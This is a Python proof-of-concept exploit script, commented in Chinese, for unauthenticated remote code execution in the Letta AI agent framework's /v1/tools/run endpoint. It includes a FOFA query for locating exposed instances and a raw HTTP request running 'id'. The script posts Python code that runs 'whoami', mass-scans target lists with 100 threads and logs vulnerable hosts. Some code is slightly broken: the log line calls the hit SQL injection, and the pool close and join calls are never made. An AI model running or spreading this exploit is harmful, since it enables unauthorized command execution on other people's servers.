# fofa：(title="Letta" || (body="/assets/index-048c9598.js" && body="/assets/index-0e31b727.css"))
"""POST /v1/tools/run HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Connection: close
Content-Type: application/json
Content-Length: 241

{
  "source_code": "def test():\n    \"\"\"Test function to execute system commands.\"\"\"\n    import os\n    return os.popen('id').read()",
  "args": {},
  "env_vars": { "PYTHONPATH": "/usr/lib/python3/dist-packages" },
  "name": "test"
}"""

# 导包
import sys,argparse
import requests
import json
import urllib3
import warnings
from multiprocessing.dummy import Pool # 多线程的库

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    test = """
 /$$                   /$$     /$$                      /$$$$$$$   /$$$$$$  /$$$$$$$$
| $$                  | $$    | $$                     | $$__  $$ /$$__  $$| $$_____/
| $$        /$$$$$$  /$$$$$$ /$$$$$$    /$$$$$$        | $$  \ $$| $$  \__/| $$      
| $$       /$$__  $$|_  $$_/|_  $$_/   |____  $$       | $$$$$$$/| $$      | $$$$$   
| $$      | $$$$$$$$  | $$    | $$      /$$$$$$$       | $$__  $$| $$      | $$__/   
| $$      | $$_____/  | $$ /$$| $$ /$$ /$$__  $$       | $$  \ $$| $$    $$| $$      
| $$$$$$$$|  $$$$$$$  |  $$$$/|  $$$$/|  $$$$$$$       | $$  | $$|  $$$$$$/| $$$$$$$$
|________/ \_______/   \___/   \___/   \_______//$$$$$$|__/  |__/ \______/ |________/
                                               |______/                              
                                                                                     
                                                                                     
"""
    print(test)


def main():
    banner()

    # 初始化
    parse = argparse.ArgumentParser(description="Letta平台AI代理框架 run 存在未授权代码执行")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help="Please input your url")
    parse.add_argument('-f','--flie',dest='file',type=str,help="Please input your file")

    # 实例化
    args = parse.parse_args()

    # 判断用户输入的参数
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 多线程处理
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usage python {sys.argv[0]} -h")


def poc(target):
    link = '/v1/tools/run'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
        "Connection": "close",
        "Content-Type": "application/json",
        "Content-Length": "241"
    }
    data = {
          "source_code": "def test():\n    \"\"\"Test function to execute system commands.\"\"\"\n    import os\n    return os.popen('whoami').read()",
            "args": {},
            "env_vars": { "PYTHONPATH": "/usr/lib/python3/dist-packages" },
            "name": "test"
    }
    proxies = {
         "http" : "http://127.0.0.1:7890",
        "https" : "http://127.0.0.1:7890"
    }

    try:
        res1 = requests.get(url=target,headers=headers,timeout=15,verify=False,proxies=proxies)
        if res1.status_code == 200:
            res2 = requests.post(url=target+link,headers=headers,json=data,timeout=15,verify=False,proxies=proxies)
            res2_content = json.loads(res2.text)
            if res2_content["status"] == "success":
                print(f"[+]该{target}存在命令执行漏洞")
                with open("result.txt",'a',encoding='utf-8') as f:      # 将结果写入到result.txt文件中
                    f.write(f"[+]该{target}存在sql注入"+'\n')
            else:
                print(f"[-]该{target}不存在命令执行漏洞")
    except:
        print(f"该{target}存在问题，请手工进行测试")


if __name__ ==  "__main__":
    main()